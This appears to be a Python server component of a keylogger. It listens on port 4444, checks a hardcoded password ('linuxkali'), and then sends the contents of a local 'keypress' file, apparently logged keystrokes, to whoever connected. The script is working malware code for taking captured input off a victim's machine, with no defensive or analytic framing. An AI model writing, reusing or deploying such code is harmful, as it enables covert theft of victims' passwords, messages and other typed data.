import socket
import sys
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(((socket.gethostbyname(socket.gethostname())), 4444))
s.listen(5)
while True:
    (client, (ip,port)) = s.accept()
    #print("[GOT CONNECTION FROM:] ", ip)
    passp = client.recv(60).decode('utf-8')
    if passp == "linuxkali":
        dataa = open(os.getcwd()+ "\\keypress"  ,"r")
        total_file = b''
        while True:
            file_data = dataa.read(2)
            if not file_data:
                break
            total_file += file_data.encode('utf-8')
        client.send(total_file)
        #print(f"[DATA SENT TO:] {ip} SUCCESSFUL")
        client.close()
    else:
        client.close()
